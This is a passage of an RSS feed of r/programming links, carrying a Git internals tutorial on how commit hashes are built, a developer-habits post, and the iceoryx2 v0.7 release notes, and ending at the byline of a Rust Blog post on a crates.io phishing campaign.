uncertainty.</p><p>P.S</p><p>I&rsquo;m not saying there aren&rsquo;t any best practices at all. What I&rsquo;m saying is that the more high-level a practice is, the more leeway you need to exercise with how rigidly you adhere to it. Simply because that&rsquo;s the nature of creative fields. If I had to roughly rank the following kinds of software development guidelines from 1 to 5, where 1 is the most low-level, and 5 is most high-level, it would look like this:</p><ul> <li>(1) Code style</li> <li>(2) Module dependency structure</li> <li>(3) Development paradigm (TDD, OOP)</li> <li>(4) System architecture practices</li> <li>(5) Work-planning (Agile, Scrum, etc)</li> </ul><p>Notice how the higher you go, the less agreement you&rsquo;ll find on what best practices are. Here&rsquo;s another ranking with creative writing:</p><ul> <li>(1) Spelling &amp; grammar</li> <li>(2) Sentence variation and prose</li> <li>(3) Chapter/Scene structure</li> <li>(4) Plot beats</li> <li>(5) Overall story and theme</li> </ul><p>Obviously unlike stories, software is never finished, but you get my point. The higher-level you go, the more complicating factors and cases there are to consider. There&rsquo;s actually a similar kind of debate in the writing world, where you have &ldquo;plotters&rdquo; who plan their story before writing, and &ldquo;pantsers&rdquo; who go by the seat of their pants and explore their plot as they write, but that&rsquo;s a whole other topic.</p><p>Anyway, thanks for reading.</p></div></section>]]></description><pubDate>Sat, 13 Sep 2025 22:01:41 +0530</pubDate></item><item><link>https://open.substack.com/pub/allvpv/p/gits-hidden-simplicity?r=6ehrq6&amp;</link><title>Git’s hidden simplicity: what’s behind every commit (open.substack.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nfzfuo/gits_hidden_simplicity_whats_behind_every_commit/</guid><comments>https://www.reddit.com/r/programming/comments/1nfzfuo/gits_hidden_simplicity_whats_behind_every_commit/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 12 min | <a href='https://www.reddit.com/r/programming/comments/1nfzfuo/gits_hidden_simplicity_whats_behind_every_commit/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>It’s time to learn some Git internals.</p></div><!-- SC_ON --></section><section class='preview-image'><p>&nbsp;</p><img src='https://substackcdn.com/image/fetch/$s_!mPYn!,w_1200,h_600,c_fill,f_jpg,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F16171831-6ba2-4abc-8d7d-ec29ea5a06d2_2678x1826.png' /></section><section class='parsed-content'><div><article><div><p>Many programmers would admit this: our knowledge of Git tends to be pretty&hellip; superficial. &ldquo;Oops, what happened? Screw that, I&rsquo;ll cherry pick my commits and start again on a fresh branch&rdquo;.</p><p>I&rsquo;ve been there. I knew the basic use cases. I even thought I was pretty experienced after a hundred or so resolved merge conflicts. But the confidence or fluency somehow wasn&rsquo;t coming. It was a hunch: learned scenarios, commands from Stack Overflow or ChatGPT, trivia-like knowledge without a solid base.</p><p><span>In software engineering, you don&rsquo;t need to have </span><em>all the knowledge</em><span>: you just need to</span><em> quickly identify and fetch the missing bits of knowledge</em><span>. My goal is to give you that low-level grounding to sharpen your intuition. Git isn&rsquo;t really complicated in its principles!</span></p><p>Disclaimer: I am not a Git expert either. Let&rsquo;s learn together.</p><p><span>Do you know how </span><em>commit</em><em>hashes</em><span> are generated? I have to admit, I thought for a while that those hashes were somehow randomized. After all, I can run </span><code>git commit --amend</code><span>, change nothing, and still get the same commit, but with a new hash, right? Likewise, </span><code>cherry-pick</code><span>ing the same commit onto another branch gives me yet another hash.</span></p><p>Boy, I couldn&rsquo;t be more wrong. The commit hash is literally just a SHA-1 checksum of the information that constitutes the commit. So two identical commits have identical hashes. Let&rsquo;s look what a commit consists of. Run the following command:</p><pre><code><code>$ git --no-replace-objects cat-file commit HEAD</code></code></pre><p><em>(In case you don&rsquo;t know: HEAD resolves to the commit you currently checked out).</em><span> Let&rsquo;s call the output of this command the </span><code>payload</code><span>. For example, the </span><code>payload</code><span> might be:</span></p><pre><code><code>tree a55ff598781e0c7870fa5c87154a7b731b1c3336 parent c1f4476718c232f4fd8d24cf6249e42995734abc author Przemys&#322;aw Kusiak <mail> 1757612521 +0200 committer Przemys&#322;aw Kusiak <mail> 1757612563 +0200 nushell: short `git status` (`-s`) by default, remove ambiguity, scale factor</mail></mail></code></code></pre><p><span>That&rsquo;s it. That&rsquo;s the full commit. Then prepend the following </span><strong>null-terminated</strong><span> string to the </span><code>payload</code><span>: &ldquo;</span><code>commit 298</code><span>&rdquo;, where </span><code>298</code><span> is the size of the payload in bytes. Compute a SHA-1 over the result and boom: you&rsquo;ve got a Git commit hash! Try it yourself:</span></p><pre><code>$ git --no-replace-objects cat-file commit HEAD &gt; payload $ printf "commit %s\0" $(wc -c &lt; payload) &gt; payload_with_header $ cat payload &gt;&gt; payload_with_header $ sha1sum payload_with_header</code></pre><p>Now compare the output to the actual commit hash:</p><pre><code>$ git rev-parse HEAD</code></pre><p><span>It works. So simple. Now, let&rsquo;s ponder what the </span><code>payload</code><span> contains:</span></p><ol><li><p><code>tree</code><span> &ndash; the hash of a tree object. More on trees later; for now, think of it as a snapshot of all files in the repo.</span></p></li><li><p><code>parent</code><span> &ndash; a hash of parent commit(s).</span></p></li><li><p><code>author</code><span>, </span><code>committer</code><span> &ndash; self-explanatory, but notice that they include date (seconds since the Unix epoch) and time zone; </span><a href="https://stackoverflow.com/a/6755848">in several scenarios it&rsquo;s possible that the author is not the committer</a><span>.</span></p></li><li><p>the commit message.</p></li></ol><p><span>We are not hashing the </span><strong>diff</strong><span> a commit introduces.</span><strong> </strong><span>Rather, the commit </span><strong>header</strong><span>, together with the referenced </span><strong>tree</strong><span> and </span><strong>parent</strong><span>, determines the hash.</span></p><p><span>And now it&rsquo;s easy to see what happens when you run </span><code>git commit --amend</code><span> and change &ldquo;nothing&rdquo;. Something still changes: the date in the </span><code>committer</code><span> field! (Note that </span><code>git show</code><span> doesn&rsquo;t display the </span><code>committer</code><span>; the date you see comes from the </span><code>author</code><span> field). But if you are fast enough to amend within the same second as the original commit, the commit hash remains unchanged!</span></p><p><span>And on a </span><code>cherry-pick</code><span>, the </span><code>parent</code><span> field changes, and usually, though not always, the </span><code>tree</code><span> field as well.</span></p><blockquote><p><span>If you&rsquo;re a careful reader, you might wonder what the </span><code>parent</code><span> field is for the </span><strong>first</strong><span> commit in a repo, and for a </span><strong>merge</strong><span> commit. What do you think? Grab a repo and verify.</span></p></blockquote><p>We saw that a commit references a tree. Let&rsquo;s check what it really is:</p><pre><code>$ tree_hash=a55ff598781e0c7870fa5c87154a7b731b1c3336 $ git cat-file tree $tree_hash</code></pre><p><span>Oops, the </span><code>payload</code><span> isn&rsquo;t human-readable text; it&rsquo;s binary data. But just like with commits, if you prepend &ldquo;</span><code>tree<payloadsize><nul></nul></payloadsize></code><span>&rdquo; to the </span><code>payload</code><span> bytes, you can compute the tree&rsquo;s hash from the result!</span></p><p>Fortunately, Git lets you pretty-print a tree&rsquo;s contents:</p><pre><code>$ git cat-file -p $tree_hash 100644 blob b9768f0236f3d932e680f1edfca69f2d8de776b8 .gitconfig 100644 blob d960f12b4f187ee82d7a1ac545e6452ebb9c2d5b .gitignore 100644 blob 2bb1c65b1090c881adc201d78ea2654d575146ea README.md 100644 blob a26fd7ac25e457c22af2f2436aac581b50b0558a bashrc 040000 tree 4572efa73b2d3d822ef76b6771a2dc4f9a22772a bin 100755 blob b9956764ddc570a78d5daa825c6b0ad4cafbc26e bootstrap.sh 040000 tree ad5b3107519883dad04997e0e1161ddbb392fc63 keyboard 040000 tree eea34f8abc6358d88ca654774dd00d8bca32fa58 lumber 040000 tree cfea0128ab25dfd83ec43f035adfe71ab1e18583 neovide 040000 tree b2504f0e9c082f5a04d07c3eb41116fecb821e7d nushell 040000 tree 6eb525af45a6f346c34a9add71600c6b8a5c9729 nvim 100644 blob 287ee75ab7c9fea8995c9219e8f90b08ba457134 screen.png</code></pre><p><span>A </span><code>tree</code><span> is just like a directory: it references other files (blobs) and directories (trees) nested inside it. It looks a bit like </span><code>ls</code><span> output. The first column records, of course, the Unix file permissions.</span></p><p><span>Nothing more, nothing less than the raw file content &ndash; no metadata. And yes, prepend null-terminated &ldquo;</span><code>blob <file_size></file_size></code><span>&rdquo; to the bytes, run </span><code>sha1sum</code><span>, and you&rsquo;ll get the blob&rsquo;s hash!</span></p><p><span>No extra metadata such as file modification time: that can be inferred from commit history. </span><strong>A simple and immutable structure:</strong><span> you can&rsquo;t change a commit without changing its hash.</span></p><p>And if you think about it, you will notice that it is a&hellip;</p><p><span>There are three types of nodes in this graph: </span><strong>commits</strong><span>, </span><strong>trees</strong><span>, and </span><strong>blobs</strong><span>. And four types of edges:</span></p><ul><li><p><strong>commit &rarr; commit</strong><span> &ndash; parent relationship; a commit has zero or more parents (usually one).</span></p></li><li><p><strong>commit &rarr; tree</strong><span> &ndash; each commit points to exactly one tree (a snapshot of files and folders).</span></p></li><li><p><strong>tree &rarr; tree</strong><span> &ndash; subdirectory relationship.</span></p></li><li><p><strong>tree &rarr; blob</strong><span> &ndash; files contained in a directory.</span></p></li></ul><p><span>Interestingly, the graph fragment reachable from a </span><strong>tree</strong><span> node doesn&rsquo;t have to form a strict tree. For example, a single blob can be referenced by multiple parents.</span></p><p><span>As you probably know, a branch is just a </span><code>ref</code><span> pointing to a commit hash. If you run this in your repo root,</span></p><pre><code>$ ls .git/refs/heads/</code></pre><p><span>you&rsquo;ll see all local branches as file names, each file just a few bytes, with the referenced commit&rsquo;s hash inside. Likewise, </span><code>.git/refs/remotes/origin/</code><span> directory contains pointers to the remote-tracking branches.</span></p><p><span>So you can think of branches as labels for commit histories. If you commit on </span><code>main</code><span>:</span></p><ul><li><p><span>the new commit will have the hash pointed to by </span><code>main</code><span> as its </span><code>parent</code><span> field;</span></p></li><li><p><span>then the </span><code>main</code><span> branch label will be updated to point to the new commit&rsquo;s hash.</span></p></li></ul><p><span>And the </span><code>.git/HEAD</code><span> file contains the name of the current branch &ndash; or commit hash, if you&rsquo;re in a detached state. This special pointer tells Git what is currently checked out.</span></p><p>I hope this clarifies your mental model and clears some of the mystery around Git. The building blocks are simple. Now you shouldn&rsquo;t have a problem answering questions such as:</p><ol><li><p>How are Git commit hashes generated? Why does rebasing produce different commit hashes?</p></li><li><p>Can a remote-tracking branch update without your local branch updating?</p></li><li><p>Which data structure represents the repository? What are the node and edge types in this DAG, and how do they relate?</p></li></ol><p>In the next articles, I plan to cover more advanced concepts, such as Git object storage, garbage collection, and how the default merge strategy works.</p><p>If you have a little more time and want to keep going, I recommend a few resources:</p><ul><li><p><a href="https://git-scm.com/book/en/v2">Pro Git Book</a><span>: very practical, but it doesn&rsquo;t lack depth; look at the </span><strong><a href="https://git-scm.com/book/en/v2/Git-Internals-Plumbing-and-Porcelain">Git Internals</a></strong><span> section</span><strong>.</strong></p></li><li><p><a href="https://eagain.net/articles/git-for-computer-scientists/">Git for Computer Scientists</a><span> by Tommi Virtanen; short and sweet: this is where I got the DAG analogy.</span></p></li></ul></div></article></div><div><h4>Discussion about this post</h4></div><div class="gallery"><p><img src="https://substackcdn.com/image/fetch/$s_!mPYn!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F16171831-6ba2-4abc-8d7d-ec29ea5a06d2_2678x1826.png"></p></div></section>]]></description><pubDate>Sat, 13 Sep 2025 20:21:31 +0530</pubDate></item><item><link>https://open.substack.com/pub/verbosemode/p/on-staying-sane-as-a-developer?r=31x3tz&amp;&amp;</link><title>On Staying Sane as a Developer (open.substack.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nfy4xg/on_staying_sane_as_a_developer/</guid><comments>https://www.reddit.com/r/programming/comments/1nfy4xg/on_staying_sane_as_a_developer/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 6 min | <a href='https://www.reddit.com/r/programming/comments/1nfy4xg/on_staying_sane_as_a_developer/'>Post permalink</a></p></section><section class='preview-image'><img src='https://images.unsplash.com/photo-1603880920705-3fcc96d6e602?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=M3wzMDAzMzh8MHwxfHNlYXJjaHwxOHx8Y2hhb3N8ZW58MHx8fHwxNzU3Njg3NTE0fDA&ixlib=rb-4.1.0&q=80&w=1080' /></section><section class='parsed-content'><div><p><span>Chaos is part of a developer&rsquo;s life. Priorities shift, tasks multiply, and the sense of being &ldquo;done&rdquo; is rare. </span><a href="https://verbosemode.dev/p/im-changing-my-writing-schedule-for">I had planned to publish one post per month in 2025</a><span>, yet here we are&mdash;</span><a href="https://verbosemode.dev/p/why-kotlins-result-type-falls-short">only one post in February so far</a><span>.</span></p><p><span>Not because I ran out of ideas. I wanted to write only </span><em>quality</em><span> posts, things that felt worth sharing, like my earlier one on Kotlin&rsquo;s </span><code>Result</code><span> that came out of a big refactor. Then I started a new job, and life quickly filled with busyness.</span></p><p>That small story is just another example of how unpredictable and messy this work can be. Which is why I want to share the habits that help me keep a bit of sanity in the middle of engineering chaos.</p><p><span>I </span><strong>try</strong><span> to do this every morning: sit down, look at my calendar, and write down the three most important tasks of the day. The goal is to bring my brain into &ldquo;work mode.&rdquo; Combine this with a coffee, and voil&agrave;&mdash;you&rsquo;ve got a simple morning routine.</span></p><p><span>If I recall correctly, I got this idea from the book </span><strong><a href="https://chrisbailey.com/hyperfocus/">Hyperfocus</a></strong><span>.</span></p><p>Morning routines are trendy right now. You&rsquo;ll find thousands of videos of people&mdash;famous or not&mdash;explaining why their morning routine is the best one ever. To be honest, sometimes I wish I had one of those strict one-hour routines with sports, meditation, and everything else. But reality bites: I don&rsquo;t want to wake up before everyone else just to cram all that in, and I simply don&rsquo;t have the time every morning.</p><p>Still, these 10 minutes of focus help me immensely to start the day right.</p><p>If you&rsquo;re familiar with Cal Newport, you might know his concept of a &ldquo;shutdown routine&rdquo;: closing open loops by moving tasks into a trusted system so they don&rsquo;t linger in your mind after work.</p><p>Open loops are everywhere in software engineering. Some tasks&mdash;like reproducing a bug&mdash;can take minutes, hours, or even days, and during that time they stick in your head. I often found myself thinking about these things well into the evening.</p><p><span>My solution is simple: an end-of-day </span><strong>brain dump</strong><span>. I jot down, often unstructured, everything that comes to mind in my notebook:</span></p><ul><li><p>What I accomplished today</p></li><li><p>What went well and what didn&rsquo;t</p></li><li><p>Any disagreements or frustrations</p></li><li><p>Thoughts on tricky tasks or ongoing bugs</p></li></ul><p><span>Some days, it&rsquo;s just a couple of bullet points. Other days, it can fill several pages. The goal is always the same: </span><strong>get everything work-related out of my head.</strong></p><p>If something pops into my mind later, I write it down immediately. This has significantly reduced the sleepless nights spent replaying problem X over and over.</p><p>It also helps me transition from &ldquo;work&rdquo; to &ldquo;private life&rdquo;&mdash;a crucial boundary when working from home.</p><p>We&rsquo;ve all been in retros, trying to recall what we worked on over the past few weeks. Sometimes, we can barely remember what we did the day before.</p><p>To make things easier, I&rsquo;ve adopted a small trick: I don&rsquo;t stop work with everything perfectly neat. Instead, I deliberately leave a test failing or a piece of code unfinished.</p><p>That way, when I sit down the next day, I know exactly where to pick things up. It jump-starts my brain and makes it easier to re-engage with the task.</p><p>You&rsquo;ve probably heard of &ldquo;Definition of Done&rdquo; (DoD)&mdash;a Scrum buzzword meant to ensure a user story is truly complete. In my experience, these team-wide DoDs often fade into obscurity.</p><p><span>But having a </span><strong>personal</strong><span> DoD can be a game changer. Mine applies to pull requests, and before opening one, I mentally check off a short list, for example:</span></p><ul><li><p>Are all tests green?</p></li><li><p>Have I removed debug logs or quick hacks?</p></li><li><p>Is this the simplest yet most effective solution?</p></li><li><p>Did I test this on Dev?</p></li><li><p>(If applicable) Did I check performance for new queries?</p></li></ul><p><span>This feels less like Scrum jargon and more like the </span><a href="https://en.wikipedia.org/wiki/Pointing_and_calling">Pointing and Calling</a><span> method&mdash;simple but effective.</span></p><p>For me, early mornings are the quietest&mdash;and most productive&mdash;parts of the day. That&rsquo;s when I tackle the hardest problems, aka &ldquo;eat the frog.&rdquo;</p><p>To protect this time, I&rsquo;ve blocked two slots in my calendar:</p><ul><li><p><strong>08:30&ndash;10:00</strong></p></li><li><p><strong>10:30&ndash;12:15</strong></p></li></ul><p>These are reserved for deep work. I try to protect them as much as possible, but I&rsquo;m not dogmatic about it&mdash;if a meeting really needs to happen then, I&rsquo;ll allow it.</p><p>The first block begins right after my short morning routine. It&rsquo;s consistently my most productive window of the day.</p><p>One of the most important lessons I&rsquo;ve learned is that there will always be open tasks. You are never truly &ldquo;done.&rdquo; That&rsquo;s why it&rsquo;s essential to have tools and habits that help you stay sane amidst the chaos.</p><p>In this post, I shared some of mine. Hopefully, they inspire you&mdash;or at least give you a starting point for developing your own.</p><p>For further reading:</p><ul><li><p><em><a href="https://calnewport.com/writing/#books">Deep Work</a></em><span> by Cal Newport (Shutdown, Time Blocking)</span></p></li><li><p><em><a href="https://chrisbailey.com/hyperfocus/">Hyperfocus</a></em><span> by Chris Bailey (Three Most Important Things)</span></p></li><li><p>Unfortunately, I can&rsquo;t find the original post where I first read about &ldquo;Leave things broken for tomorrow.&rdquo;</p></li></ul><p>If this post sparked a thought, I&rsquo;d love to hear from you&mdash;drop me a line or leave a comment &#128172;. Always curious about how others tackle the chaos!</p></div></section>]]></description><pubDate>Sat, 13 Sep 2025 19:26:19 +0530</pubDate></item><item><link>https://ekxide.io/blog/iceoryx2-0-7-release/</link><title>Announcing iceoryx2 v0.7: Fast and Robust Inter-Process Communication (IPC) Library for Rust, Python, C++, and C (ekxide.io)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nfvdvk/announcing_iceoryx2_v07_fast_and_robust/</guid><comments>https://www.reddit.com/r/programming/comments/1nfvdvk/announcing_iceoryx2_v07_fast_and_robust/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 11 min | <a href='https://www.reddit.com/r/programming/comments/1nfvdvk/announcing_iceoryx2_v07_fast_and_robust/'>Post permalink</a></p></section><section class='preview-image'><img src='https://www.ekxide.com/logo/ekxide-black.png' /></section><section class='parsed-content'><div><h3>What Is iceoryx2</h3><p><strong>iceoryx2</strong> is a service-based communication library designed to build robust and efficient decentralized systems. It enables ultra low-latency communication between processes &mdash; similar to Unix domain sockets or message queues, but significantly faster and easier to use.</p><p>It includes language bindings for C, C++, Python, and Rust and it runs on Linux, macOS, Windows, FreeBSD and QNX.</p><p>iceoryx2 supports messaging patterns such as publish-subscribe, events, request-response stream and the introduced blackboard pattern - a key-value repository in shared memory. It is robust and comes with a decentralized architecture without the need for a central broker.</p><p>Check out the <a href="https://github.com/eclipse-iceoryx/iceoryx2/tree/main/benchmarks">iceoryx2 benchmarks</a> and try them out on your platform!</p><h3>Release v0.7.0</h3><p>With the new v0.7.0 release of iceoryx2, we&rsquo;re adding full Python bindings and a network tunnel. That means you can now send data not just between processes on the same machine, but also across hosts - iceoryx2 handles the communication details for you.</p><p>We&rsquo;ve also finished the first version of the <a href="https://ekxide.github.io/iceoryx2-book/main/">iceoryx2 Book</a>, which not only helps you get started quickly but also provides deep background on the overall architecture.</p><p>Debugging, introspection, and record-and-replay of data are now possible with the command-line client. On top of that, we&rsquo;ve introduced a new messaging pattern called <strong>blackboard</strong>, a key-value repository in shared memory.</p><p>And one more thing: iceoryx2 now runs on <strong>QNX 7.1</strong>. There are plenty of smaller enhancements too. Check out the full release notes here: <a href="https://github.com/eclipse-iceoryx/iceoryx2/releases/tag/v0.7.0">iceoryx2 v0.7.0 release</a></p><ul> <li><a href="https://ekxide.io/blog/iceoryx2-0-7-release/#the-iceoryx2-book">The iceoryx2 Book</a></li> <li><a href="https://ekxide.io/blog/iceoryx2-0-7-release/#python-language-bindings">Python Language Bindings</a></li> <li><a href="https://ekxide.io/blog/iceoryx2-0-7-release/#network-communication">Network Communication</a></li> <li><a href="https://ekxide.io/blog/iceoryx2-0-7-release/#command-line-client-debugging-and-introspection">Command Line Client: Debugging And Introspection</a></li> <li><a href="https://ekxide.io/blog/iceoryx2-0-7-release/#record-and-replay">Record And Replay</a></li> <li><a href="https://ekxide.io/blog/iceoryx2-0-7-release/#messaging-pattern-blackboard">Messaging Pattern: Blackboard</a></li> <li><a href="https://ekxide.io/blog/iceoryx2-0-7-release/#new-supported-platforms">New Supported Platforms</a></li> <li><a href="https://ekxide.io/blog/iceoryx2-0-7-release/#other-feature-highlights">Other Feature Highlights</a></li> </ul> <h4>The iceoryx2 Book</h4><p>We&rsquo;ve put effort into the <a href="https://ekxide.github.io/iceoryx2-book/main/">iceoryx2 book</a>, which serves as a starting point for every user. Whether you&rsquo;re looking for a quick introduction, a getting-started tutorial, or a deeper dive into the architecture of iceoryx2.</p><p>If you&rsquo;d like to contribute, by writing an article, creating a tutorial on a specific topic, or reporting an issue, we&rsquo;d be glad to receive your pull request: <a href="https://github.com/ekxide/iceoryx2-book">https://github.com/ekxide/iceoryx2-book</a></p><p><strong>Remark:</strong> The iceoryx2 book replaces the previous ReadTheDocs documentation and provides references for C, C++, Python, and Rust.</p><h4>Python Language Bindings</h4><p>We&rsquo;ve ported the iceoryx2 API to Python and added an extensive set of <a href="https://github.com/eclipse-iceoryx/iceoryx2/tree/main/examples/python">examples on GitHub</a>.</p><p>If you&rsquo;re new to iceoryx2, start with the <em>Getting Started</em> tutorial <a href="https://ekxide.github.io/iceoryx2-book/main/getting-started/robot-nervous-system/index.html">A Robot Nervous System</a> in the iceoryx2 book. It walks through all the major features across every supported language. You can switch between languages while reading, which makes it easy to build complex systems that mix Python, C, C++, and Rust - without paying the serialization overhead.</p><p>A highlight is the publish&ndash;subscribe cross-language example, where Python, C, C++, and Rust processes exchange data directly in shared memory. Check it out:</p><ul> <li><a href="https://github.com/eclipse-iceoryx/iceoryx2/tree/main/examples/python/publish_subscribe_cross_language">Python Publish&ndash;Subscribe Cross-Language</a></li> <li><a href="https://github.com/eclipse-iceoryx/iceoryx2/tree/main/examples/c/publish_subscribe_cross_language">C Publish&ndash;Subscribe Cross-Language</a></li> <li><a href="https://github.com/eclipse-iceoryx/iceoryx2/tree/main/examples/cxx/publish_subscribe_cross_language">C++ Publish&ndash;Subscribe Cross-Language</a></li> <li><a href="https://github.com/eclipse-iceoryx/iceoryx2/tree/main/examples/rust/publish_subscribe_cross_language">Rust Publish&ndash;Subscribe Cross-Language</a></li> </ul><p>And this isn&rsquo;t limited to publish-subscribe, the same zero-copy, cross-language communication works with all messaging patterns, including request&ndash;response and events.</p><h4>Network Communication</h4><p>Until now, iceoryx2 focused on inter-process communication. With the new <strong>network tunnel</strong>, you can communicate between hosts as well. No complicated setup, no configuration headaches, just run the CLI:</p><pre><code><span>cargo</span><span> install iceoryx2-cli </span><span>iox2</span><span> tunnel zenoh </span></code></pre><p>Do that on each host, and your publish&ndash;subscribe and event communication is instantly available across machines.</p><p>The network tunnel, that connects iceoryx2 instances across the network, is still in development, so some patterns, like request&ndash;response and blackboard, aren&rsquo;t supported yet. But it&rsquo;s also the first step toward a full <strong>gateway</strong>: the idea is that you&rsquo;ll use the native iceoryx2 API while the gateway connects to other protocols in the background.</p><p>Picture this: you start a gRPC, MQTT, or DDS gateway, and suddenly your iceoryx2 application can talk to anything, or let others talk to you, without changing a single line of code.</p><p>That&rsquo;s the vision. And with the tunnel, you can already connect iceoryx2 applications across hosts today by just running <code>iox2 tunnel zenoh</code>.</p><h4>Command Line Client: Debugging And Introspection</h4><p>We are continuously improving the <code>iox2</code> command-line client to make it a versatile tool for working with iceoryx2. It allows direct interaction with iceoryx2 from the shell, which is especially useful for debugging.</p><p>Let&rsquo;s start with events. Open two terminals and run the listener example in one of them:</p><pre><code><span>cargo</span><span> run</span><span> --example</span><span> event_listener </span></code></pre><p>Now you can send event notifications to this process and wake it up explicitly:</p><pre><code><span>cargo</span><span> install iceoryx2-cli </span><span>iox2</span><span> service notify</span><span> --event-id</span><span> 1</span><span> --num</span><span> 2</span><span> --interval-in-ms</span><span> 1500 MyEventName </span></code></pre><p>You can also wait for events directly on the command line, or send and receive publish-subscribe samples. More details and examples can be found in the <a href="https://ekxide.github.io/iceoryx2-book/main/getting-started/robot-nervous-system/command-line-tools-and-debugging.html">getting started article on the command line</a> in the iceoryx2 book.</p><h4>Record And Replay</h4><p>The <code>iox2</code> command-line client also supports <strong>record and replay</strong>. This is useful when you want to capture real data and feed it back into the system during development - for example, creating an endlessly repeating stream of sensor data.</p><p>Let&rsquo;s walk through it with the publish-subscribe example. Start the publisher in one terminal:</p><pre><code><span>cargo</span><span> run</span><span> --example</span><span> publish_subscribe_publisher </span></code></pre><p>In another terminal, record the data for 10 seconds and write it to <code>record.dat</code>:</p><pre><code><span>iox2</span><span> service record</span><span> --timeout-in-sec</span><span> 10</span><span> --output</span><span> record.dat </span><span>"</span><span>My/Funk/ServiceName</span><span>" </span></code></pre><p>The output file is human-readable by default. <strong>Tip:</strong> Payloads are stored in hex. This makes it easy to edit them manually and then inject modified data back into the system to test edge cases. Next, stop the publisher and start the subscriber:</p><pre><code><span>cargo</span><span> run</span><span> --example</span><span> publish_subscribe_subscriber </span></code></pre><p>Now replay the recording twice:</p><pre><code><span>iox2</span><span> service replay</span><span> --input</span><span> record.dat</span><span> --repetitions</span><span> 2 </span></code></pre><p>A more detailed walkthrough is available in the <a href="https://ekxide.github.io/iceoryx2-book/main/getting-started/robot-nervous-system/command-line-tools-and-debugging.html#recording-and-replaying-data">getting started article on the command line</a> in the iceoryx2 book.</p><h4>Messaging Pattern: Blackboard</h4><p>The publish-subscribe pattern can reach its limits when a single publisher needs to serve hundreds or even thousands of subscribers. This often happens when the system requires a global state - for example, in a simulation where every entity&rsquo;s position and movement must be tracked, or when maintaining a global configuration across multiple components.</p><p>With the newly introduced <strong>blackboard messaging pattern</strong>, iceoryx2 provides a shared-memory key-value repository that every process can access efficiently. A single process can maintain the global state in a thread-safe way, while all others can read it without overhead.</p><p>The iceoryx2 book contains a <a href="https://ekxide.github.io/iceoryx2-book/main/getting-started/robot-nervous-system/blackboard.html">getting started article on the blackboard</a>, and you can also explore some hands-on code in the <a href="https://github.com/eclipse-iceoryx/iceoryx2/tree/main/examples">examples folder on GitHub</a>.</p><p>For deeper background on the concept itself, see the article <a href="https://ekxide.io/blog/advanced-messaging-patterns-blackboard/">Advanced Messaging Patterns &ndash; Blackboard</a>.</p><p><strong>Remark:</strong> The blackboard messaging pattern is currently available only in Rust. C, C++, and Python bindings will be added in the next release.</p><h4>New Supported Platforms</h4><p>For Yocto users, we now provide a <a href="https://github.com/eclipse-iceoryx/meta-iceoryx2">dedicated Yocto layer on GitHub</a>.</p><p>We have also added support for <strong>QNX 7.1</strong>. In the open-source repository, QNX is available as a tier-3 platform due to license restrictions. If you require tier-1 support, please reach out to us.</p><p>In addition, there is a <strong>VxWorks</strong> proof of concept. Contact us for details.</p><h4>Other Feature Highlights</h4><p><strong>Thread-safe service types</strong> Until now, iceoryx2 ports were not thread-safe, which made async use cases tricky. This release introduces <code>ipc_threadsafe::Service</code> and <code>local_threadsafe::Service</code>. These variants are optimized for different contexts, and the <a href="https://github.com/eclipse-iceoryx/iceoryx2/blob/main/examples/rust/service_types/">service variant example on GitHub</a> introduces all of them, how you can specialize them and shows how to pick the right one.</p><p><strong>Service discovery</strong> We added a request-response service to obtain the full list of all running services in the system. The list can be kept up to date by subscribing to a publish-subscribe service. See the <a href="https://github.com/eclipse-iceoryx/iceoryx2/tree/main/examples/rust/discovery_service">discovery example</a>.</p><p><strong>Graceful shutdown</strong> Client-server connections can now be shut down gracefully while the client is receiving a response stream. The API provides <code>PendingResponse::set_disconnect_hint()</code> and <code>ActiveRequest::has_disconnect_hint()</code>.</p><h3>Roadmap: What&rsquo;s Next?</h3><p><a href="https://github.com/eclipse-iceoryx/iceoryx2/blob/main/ROADMAP.md">iceoryx2 Roadmap</a>.</p><ul> <li><code>no_std</code> support for embedded use cases</li> <li>Blackboard Messaging Pattern Language Bindings for C, C++ and Python</li> <li>QNX 8.0</li> <li>network tunnel: support for request-response and blackboard</li> <li>(Moonshot) Go language bindings</li> </ul> <h3>Thank You</h3><p>We want to thank our community. Your ideas, discussions, and collaborative spirit help shape iceoryx2 every day. Even frustrating bugs become less painful when tackled with humor and openness.</p><p>Also a big thank you to the iceoryx team, which was relentless in implementing all those features.</p><p>And finally, a big thank you to our customers who share our vision:</p><p><strong>To create an open-source, certifiable base and communication library that can be trusted in mission-critical systems.</strong></p><ul> <li><a href="https://www.reddit.com/r/programming/comments/1nfvdvk/announcing_iceoryx2_v07_fast_and_robust/">Discuss on Reddit</a></li> <li><a href="https://programming.dev/post/37369902">Discuss on programming.dev</a></li> <li><a href="https://github.com/eclipse-iceoryx/iceoryx2">Project iceoryx2 on GitHub</a></li> <li><a href="https://github.com/ekxide/rmw_iceoryx2">Project iceoryx2 RMW for ROS on GitHub</a></li> <li><a href="https://crates.io/crates/iceoryx2">Project on crates.io</a></li> </ul> </div></section>]]></description><pubDate>Sat, 13 Sep 2025 17:13:37 +0530</pubDate></item><item><link>https://blog.rust-lang.org/2025/09/12/crates-io-phishing-campaign/</link><title>crates.io phishing campaign | Rust Blog (blog.rust-lang.org)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nfsfml/cratesio_phishing_campaign_rust_blog/</guid><comments>https://www.reddit.com/r/programming/comments/1nfsfml/cratesio_phishing_campaign_rust_blog/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 1 min | <a href='https://www.reddit.com/r/programming/comments/1nfsfml/cratesio_phishing_campaign_rust_blog/'>Post permalink</a></p></section><section class='preview-image'><img src='https://www.rust-lang.org/static/images/rust-social-wide.jpg' /></section><section class='parsed-content'><p>Sept. 12, 2025 &middot; Rust Security Response WG, crates.io team 